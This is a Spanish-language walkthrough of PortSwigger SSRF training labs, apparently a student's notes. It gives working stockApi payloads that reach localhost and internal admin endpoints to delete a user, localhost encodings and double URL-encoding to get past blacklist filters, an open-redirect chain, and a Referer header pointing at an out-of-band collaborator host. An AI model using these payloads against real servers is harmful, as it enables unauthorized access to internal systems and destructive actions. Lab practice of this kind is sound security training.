# SSFR

La falsificación de solicitudes del lado del servidor (también conocida como SSRF) es una vulnerabilidad de seguridad web que permite a un atacante inducir a la aplicación del lado del servidor a realizar solicitudes a una ubicación no deseada.

En un ataque SSRF típico, el atacante puede hacer que el servidor establezca una conexión con servicios solo internos dentro de la infraestructura de la organización. En otros casos, pueden obligar al servidor a conectarse a sistemas externos arbitrarios, lo que podría filtrar datos confidenciales, como credenciales de autorización.

# Basic SSRF against the local server

Para este laboratorio nos damos cuenta que la peticion para revisar stock llama a una api 
entonces sopechamos que podemos que puede hacer peticiones a nombre del servidor


```
stockApi=http://localhost/admin/delete?username=carlos


```
Y borramos el usuario.


# Basic SSRF against another back-end system

Para este laboratorio usamos el intruder en el stock usamos el intruder con el payload brute force del 1 al 255
recordar usar el url encode.


```
stockApi=http://192.168.0.estenumerovaria:8080/admin/delete?username=carlos

```

Y borramos el usuario.

# SSRF with blacklist-based input filter

Para este lab se necesita bypasear la proteccion para que se permita acceder al /admin y posteriormente borrar un usuario:

## Local host y sus diferentes representaciones

Esta bloqueado el 127.0.0.1 entonces necesitamos usar otra representacion algunas de estas son:

```
-2130706433
-017700000001
-127.1
```
Se uso el 127.1 lo que nos hace pensar que podria ser un filtro que compara Regex. Despues se intenta meter al /admin pero esta bloqueada.

```
stockApi=http://127.1/admin
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65

```

Entonces lo que tenemos que hacer es Url encodear seleccionando el string clic derecho -> convert selection -> URL -> url-encode-all-the Characters.
Y lo hacemos 2 veces con lo cual bypasea la regex y permite que se borre al usuario.

```
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos

```
FIN

# SSRF with filter bypass via open redirection vulnerability

Para este lab se tienen que hacer uso de varios conceptos como:

## Open Redirect

> An open redirect vulnerability occurs when an application allows a user to control a redirect or forward to another URL. If the app does not validate untrusted user input, an attacker could supply a URL that redirects an unsuspecting victim from a legitimate domain to an attacker's phishing site.

Si intentamos hacer SSRF nos damos cuenta que no se puede pero si te das cuenta existe un boton de next item el cual tiene un path que se pasa como argumento

```
GET /product/nextProduct?currentProductId=1&path=https://ww.google.com/ HTTP/1.1

```

Si vamos a la pagina que checa el stock nos damos cuenta que tambien ve en la ruta /product:


```
stockApi=/product/stock/check?productId=1&storeId=1

```
Entonces recordando como se pasa la informacion en html(tarea eso y lo de los forms) nos da la idea que quiza podemos usar la redireccion desde aqui.
Usar el URL encode para esta peticion pero tambien observar que si visitas el /admin si lo visita y nos muestra el panel de control.


```
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
Finalmente nos damos cuenta que se se puede y borramos el usuario.

# Blind SSRF with out-of-band detection

Para este lab el el SSRF se puede generar desde la header Refer de la siguiente manera :

```
Referer: https://lk9753mlgwanxord5u7ns37zhqnib7.oastify.com

```

Referencia

> https://portswigger.net/web-security/ssrf
